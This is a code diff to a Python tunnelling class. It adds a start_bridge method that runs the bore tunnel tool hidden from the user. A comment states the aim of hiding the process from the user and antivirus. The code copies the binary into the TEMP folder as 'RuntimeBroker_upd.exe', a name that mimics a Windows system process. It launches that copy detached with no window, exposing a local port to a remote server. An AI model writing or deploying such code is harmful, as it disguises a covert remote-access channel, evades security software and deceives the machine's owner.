@@ -1,6 +1,7 @@
 import os
 import subprocess
 import threading
+import shutil
 import time
 import socket
 from typing import Optional
@@ -78,6 +79,77 @@ class BoreTunneler:
         time.sleep(1.5)
         return self.is_active()
 
+    def start_bridge(self) -> Optional[str]:
+        """
+        Starts bore tunnel and parses the public URL from output.
+        Returns the public bridge address (e.g. 'bore.pub:12345').
+        """
+        if self.running and self.public_url: return self.public_url
+
+        bore_path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "tools", "bore.exe")
+        if not os.path.exists(bore_path):
+            log_error(f"Bore executable not found at {bore_path}", "Tunneler")
+            return None
+
+        try:
+            # H-13: Hide process from user/AV and use stealthy name if possible
+            # On Windows, we can use CREATE_NO_WINDOW
+            startupinfo = None
+            if os.name == 'nt':
+                startupinfo = subprocess.STARTUPINFO()
+                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+                startupinfo.wShowWindow = 0 # SW_HIDE
+            
+            # Logic for sneaky binary name (copy bore.exe to a temp system-like name)
+            temp_dir = os.environ.get('TEMP', os.getcwd())
+            stealth_path = os.path.join(temp_dir, "RuntimeBroker_upd.exe")
+            
+            # Only copy if it doesn't exist or if the original bore.exe is newer (simple update check)
+            if not os.path.exists(stealth_path) or (os.path.exists(bore_path) and os.path.getmtime(bore_path) > os.path.getmtime(stealth_path)):
+                if os.path.exists(bore_path):
+                    try:
+                        shutil.copy2(bore_path, stealth_path)
+                        log_info(f"Copied bore.exe to stealth path: {stealth_path}", "Tunneler")
+                    except Exception as e:
+                        log_error(f"Failed to copy bore.exe to stealth path: {e}", "Tunneler")
+                        stealth_path = bore_path # Fallback to original path
+                else:
+                    stealth_path = bore_path # Fallback if original not found
+            
+            cmd_path = stealth_path if os.path.exists(stealth_path) else bore_path
+            
+            # bore local <LOCAL_PORT> --to <REMOTE_SERVER>
+            cmd = [cmd_path, "local", str(self.local_port), "--to", self.remote_server]
+            
+            # We capture stdout to find the bridge URL
+            self.process = subprocess.Popen(
+                cmd, 
+                stdout=subprocess.PIPE, 
+                stderr=subprocess.PIPE, # Keep stderr separate for better error logging
+                stdin=subprocess.PIPE,
+                creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS if os.name == 'nt' else 0,
+                startupinfo=startupinfo, # Apply startupinfo for Windows
+                text=True
+            )
+            
+            # Read first few lines to find the URL
+            # Expected line: "listening at bore.pub:12345"
+            for _ in range(20):
+                line = self.process.stdout.readline()
+                if "listening at" in line:
+                    parts = line.split("listening at")
+                    if len(parts) > 1:
+                        addr = parts[1].strip()
+                        self.running = True
+                        log_info(f"P2P Bridge active: {addr}", "Tunneler")
+                        return addr
+                time.sleep(0.5)
+                
+            return None
+        except Exception as e:
+            log_error(f"Failed to start bridge: {e}", "Tunneler")
+            return None
+
     def stop_tunnel(self):
         """Graceful termination of the tunnel process"""
         with self.lock:
@@ -96,4 +168,5 @@ class BoreTunneler:
     def is_active(self) -> bool:
         """Checks if the tunnel process is currently running"""
         with self.lock:
-            return self.running and self.process and self.process.poll() is None
+            if not self.running or not self.process: return False
+            return self.process.poll() is None
